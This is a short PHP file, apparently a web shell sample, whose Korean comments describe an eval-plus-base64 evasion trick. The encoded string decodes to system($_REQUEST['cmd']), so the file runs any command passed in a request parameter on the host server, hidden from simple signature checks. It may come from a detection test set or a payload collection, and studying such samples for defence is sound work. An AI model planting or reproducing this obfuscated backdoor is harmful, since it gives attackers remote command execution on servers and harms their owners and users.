<?php
// eval + base64 (이중 인코딩 우회)
// 내부 payload: system($_REQUEST['cmd']);
eval(base64_decode('c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOw=='));
?>
